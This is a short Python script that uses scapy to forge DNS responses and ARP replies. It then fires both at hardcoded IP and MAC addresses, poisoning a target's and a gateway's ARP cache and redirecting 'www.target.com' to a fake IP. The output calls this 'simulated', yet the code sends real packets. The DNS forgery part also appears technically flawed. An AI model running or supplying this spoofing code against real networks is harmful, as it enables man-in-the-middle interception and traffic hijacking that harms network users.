from scapy.all import send, sendp
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dns import DNS, DNSRR, DNSQR

def dns_spoof(target_ip, victim_ip, fake_ip):
    # Craft DNS response with fake IP
    ip = IP(dst=target_ip, src=victim_ip)
    udp = UDP(dport=53, sport=12345)
    dns = DNS(id=1234, qr=1, aa=1, qd=DNSQR(qname="www.target.com"))
    dns_rr = DNSRR(rrname="www.target.com", rdata=fake_ip)

    # Combine layers and send spoofed DNS response
    packet = ip/udp/dns/dns_rr
    send(packet, verbose=0)
    print(f"DNS Spoofing simulated: {target_ip} redirected to {fake_ip}")


def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    # Create ARP response to spoof target's ARP cache
    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    ether_target = Ether(dst=target_mac)

    # Create ARP response to spoof gateway's ARP cache
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    ether_gateway = Ether(dst=gateway_mac)

    # Send ARP spoofing packets
    sendp(ether_target/arp_target, verbose=0)
    sendp(ether_gateway/arp_gateway, verbose=0)
    print(f"ARP Spoofing simulated: {target_ip} and {gateway_ip} poisoned.")


target_ip = "192.168.56.1"
victim_ip = "192.168.1.2"
fake_ip = "10.0.0.1"

target_mac = "0A:00:27:00:00:03"
gateway_ip = "192.168.1.1"
gateway_mac = "a8:fb:40:9d:d1:03"

dns_spoof(target_ip, victim_ip, fake_ip)

arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac)